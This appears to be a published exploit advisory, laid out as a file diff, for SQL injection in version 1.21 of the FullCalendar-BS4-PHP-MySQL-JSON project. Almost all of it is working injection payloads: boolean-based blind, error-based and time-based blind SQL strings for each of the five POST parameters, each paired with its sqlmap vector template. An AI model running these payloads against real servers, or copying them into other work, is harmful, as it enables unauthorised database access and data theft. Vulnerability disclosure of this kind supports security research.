@@ -1,0 +1,90 @@
+Exploit Title: waldronmatt FullCalendar-BS4-PHP-MySQL-JSON 1.21 - 'start' SQL Injection
+Date: 2019-10-28
+Exploit Author: Cakes
+Vendor Homepage: waldronmatt/FullCalendar-BS4-PHP-MySQL-JSON
+Software Link: https://github.com/waldronmatt/FullCalendar-BS4-PHP-MySQL-JSON.git
+Version: 1.21
+Tested on: CentOS7
+CVE : N/A
+
+# PoC: Multiple SQL Injection vulnerabilities
+
+Parameter: start (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: title=Test&description=Test&color=#0071c5&start=2019-01-23 00:00:00' RLIKE (SELECT (CASE WHEN (3201=3201) THEN 0x323031392d30312d32332030303a30303a3030 ELSE 0x28 END)) AND 'ScZt'='ScZt&end=2019-01-24 00:00:00
+    Vector: RLIKE (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE 0x28 END))
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: title=Test&description=Test&color=#0071c5&start=2019-01-23 00:00:00' AND (SELECT 6693 FROM(SELECT COUNT(*),CONCAT(0x71626b6a71,(SELECT (ELT(6693=6693,1))),0x7178767671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'oFHi'='oFHi&end=2019-01-24 00:00:00
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: title=Test&description=Test&color=#0071c5&start=2019-01-23 00:00:00' AND (SELECT 6752 FROM (SELECT(SLEEP(5)))ImfQ) AND 'EAnH'='EAnH&end=2019-01-24 00:00:00
+    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])
+
+Parameter: end (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: title=Test&description=Test&color=#0071c5&start=2019-01-23 00:00:00&end=2019-01-24 00:00:00' RLIKE (SELECT (CASE WHEN (4825=4825) THEN 0x323031392d30312d32342030303a30303a3030 ELSE 0x28 END)) AND 'xqhi'='xqhi
+    Vector: RLIKE (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE 0x28 END))
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: title=Test&description=Test&color=#0071c5&start=2019-01-23 00:00:00&end=2019-01-24 00:00:00' AND (SELECT 4638 FROM(SELECT COUNT(*),CONCAT(0x71626b6a71,(SELECT (ELT(4638=4638,1))),0x7178767671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'OvvR'='OvvR
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: title=Test&description=Test&color=#0071c5&start=2019-01-23 00:00:00&end=2019-01-24 00:00:00' AND (SELECT 6750 FROM (SELECT(SLEEP(5)))gPYF) AND 'Xhni'='Xhni
+    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])
+
+Parameter: title (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: title=Test'||(SELECT 0x68506d50 FROM DUAL WHERE 9657=9657 AND 5501=5501)||'&description=Test&color=#0071c5&start=2019-01-23 00:00:00&end=2019-01-24 00:00:00
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: title=Test'||(SELECT 0x684f4b6d FROM DUAL WHERE 1515=1515 AND (SELECT 6271 FROM(SELECT COUNT(*),CONCAT(0x71626b6a71,(SELECT (ELT(6271=6271,1))),0x7178767671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||'&description=Test&color=#0071c5&start=2019-01-23 00:00:00&end=2019-01-24 00:00:00
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: title=Test'||(SELECT 0x72417477 FROM DUAL WHERE 3543=3543 AND (SELECT 4482 FROM (SELECT(SLEEP(5)))AnGw))||'&description=Test&color=#0071c5&start=2019-01-23 00:00:00&end=2019-01-24 00:00:00
+    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])
+
+Parameter: description (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: title=Test&description=Test'||(SELECT 0x7570456a FROM DUAL WHERE 7753=7753 AND 5528=5528)||'&color=#0071c5&start=2019-01-23 00:00:00&end=2019-01-24 00:00:00
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: title=Test&description=Test'||(SELECT 0x4f6d6f41 FROM DUAL WHERE 6915=6915 AND (SELECT 9677 FROM(SELECT COUNT(*),CONCAT(0x71626b6a71,(SELECT (ELT(9677=9677,1))),0x7178767671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||'&color=#0071c5&start=2019-01-23 00:00:00&end=2019-01-24 00:00:00
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: title=Test&description=Test'||(SELECT 0x6a424e63 FROM DUAL WHERE 6961=6961 AND (SELECT 9467 FROM (SELECT(SLEEP(5)))jHfq))||'&color=#0071c5&start=2019-01-23 00:00:00&end=2019-01-24 00:00:00
+    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])
+
+Parameter: color (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: title=Test&description=Test&color=#0071c5' RLIKE (SELECT (CASE WHEN (2320=2320) THEN 0x23303037316335 ELSE 0x28 END)) AND 'XfIW'='XfIW&start=2019-01-23 00:00:00&end=2019-01-24 00:00:00
+    Vector: RLIKE (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE 0x28 END))
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: title=Test&description=Test&color=#0071c5' OR (SELECT 2035 FROM(SELECT COUNT(*),CONCAT(0x71626b6a71,(SELECT (ELT(2035=2035,1))),0x7178767671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'nWLO'='nWLO&start=2019-01-23 00:00:00&end=2019-01-24 00:00:00
+    Vector: OR (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind (query SLEEP)
+    Payload: title=Test&description=Test&color=#0071c5' OR (SELECT 7165 FROM (SELECT(SLEEP(5)))kngP) AND 'oklj'='oklj&start=2019-01-23 00:00:00&end=2019-01-24 00:00:00
+    Vector: OR (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])
